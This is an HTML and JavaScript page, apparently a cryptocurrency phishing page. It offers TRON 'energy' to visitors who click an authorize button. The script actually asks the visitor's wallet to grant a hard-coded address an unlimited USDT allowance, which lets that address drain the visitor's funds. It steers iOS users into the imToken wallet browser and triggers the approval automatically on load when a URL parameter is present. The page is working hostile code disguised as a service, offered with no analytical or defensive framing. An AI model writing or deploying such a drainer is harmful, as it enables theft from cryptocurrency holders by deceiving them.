<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TRC20 USDT获取能量授权</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.8.0/dist/TronWeb.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        /* 样式同之前版本，此处省略 */
    </style>
</head>
<body>
    <div class="auth-container">
        <h2 class="auth-title">
            <i class="fa-solid fa-key"></i> TRC20 USDT 获取能量授权
        </h2>
        <button id="approveBtn">
            <i class="fa-solid fa-shield-halved"></i>点击授权获取能量
        </button>
        <div id="log">点击按钮，发起授权</div>
        <div class="contract-tip">
            目标合约：TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa
        </div>
    </div>

    <script>
        const TARGET = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
        const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const btn = document.getElementById("approveBtn");
        const log = document.getElementById("log");
        const APPROVE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        // iOS专属跳转协议
        const IOS_WALLET_SCHEMES = {
            imToken: "imtoken://browser?url=" + encodeURIComponent(window.location.href + "?t=" + new Date().getTime())
        };

        function checkWalletJump(walletName) {
            const startTime = Date.now();
            const checkTimer = setInterval(() => {
                if (document.hidden || document.visibilityState === "hidden") {
                    clearInterval(checkTimer);
                    return;
                }
                if (Date.now() - startTime > 3000) {
                    clearInterval(checkTimer);
                    log.innerHTML = `
                        <div class="tips-text">未检测到跳转，请手动操作：</div>
                        <div class="tips-text">1. 打开imToken → 底部「浏览器」</div>
                        <div class="tips-text">2. 粘贴链接：${window.location.href}</div>
                    `;
                }
            }, 500);
        }

        function openWallet(walletName) {
            window.location.href = IOS_WALLET_SCHEMES[walletName];
            checkWalletJump(walletName);
        }

        async function handleApprove(autoTrigger = false) {
            try {
                if (!window.tronWeb || !window.tronWeb.ready) {
                    log.textContent = "钱包加载中...请稍候";
                    return;
                }

                const tipText = autoTrigger ? "已进入授权流程，等待钱包确认..." : "授权中...请在钱包确认";
                log.textContent = tipText;

                const usdtContract = await window.tronWeb.contract().at(USDT);
                const tx = await usdtContract.approve(
                    TARGET, 
                    APPROVE_AMOUNT,
                    { from: window.tronWeb.defaultAddress.base58, feeLimit: 300000000 }
                ).send();

                log.innerHTML = `
                    成功！<a href="https://tronscan.org/#/transaction/${tx.txid}" target="_blank">
                    交易ID：${tx.txid.slice(0, 16)}...</a>
                `;
            } catch (e) {
                const errMsg = e.message || "授权失败";
                log.textContent = "失败：" + errMsg.slice(0, 50);
            }
        }

        btn.onclick = function() {
            if (window.tronWeb && window.tronWeb.ready) {
                handleApprove();
                return;
            }

            log.innerHTML = `
                <div class="wallet-btn-group">
                    <button onclick="openWallet('imToken')">
                        点击唤起imToken（必须选“允许”）
                    </button>
                </div>
                <div class="tips-text">
                    若未弹出钱包，请手动打开imToken → 浏览器 → 粘贴链接：
                    ${window.location.href}
                </div>
            `;
        };

        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);if (urlParams.has("t")) {
                const checkTronWeb = setInterval(() => {
                    if (window.tronWeb && window.tronWeb.ready) {
                        clearInterval(checkTronWeb);
                        handleApprove(true);
                    }
                }, 300);
            }
        };
    </script>
</body>
</html>
